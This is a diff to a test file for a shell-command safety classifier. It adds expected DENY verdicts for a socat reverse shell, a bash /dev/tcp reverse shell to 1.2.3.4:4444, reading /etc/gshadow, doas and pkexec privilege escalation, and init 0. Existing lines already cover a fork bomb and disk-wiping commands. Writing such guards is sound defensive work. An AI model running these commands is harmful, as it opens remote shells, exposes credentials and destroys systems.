@@ -66,6 +66,13 @@ def test_workspace_edit_refuses_missing_or_ambiguous(tmp_path: Path) -> None:
         ("cp file /dev/nvme0n1", Verdict.DENY),
         ("mkfs.ext4 /dev/sdb", Verdict.DENY),
         ("dd if=input.bin of=output.bin", Verdict.NEEDS_APPROVAL),  # file-to-file, not a device
+        ("doas rm x", Verdict.DENY),  # privilege escalation (BSD)
+        ("pkexec id", Verdict.DENY),
+        ("init 0", Verdict.DENY),  # power control via init
+        ("cat /etc/gshadow", Verdict.DENY),
+        ("socat TCP:h:p EXEC:sh", Verdict.DENY),  # reverse shell
+        ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", Verdict.DENY),
+        ("git init", Verdict.ALLOW),  # not caught by the init-power pattern
         ("chmod 777 mydir", Verdict.NEEDS_APPROVAL),  # 777 but not a broad path
         (":(){ :|:& };:", Verdict.DENY),
         ("python solution.py", Verdict.ALLOW),
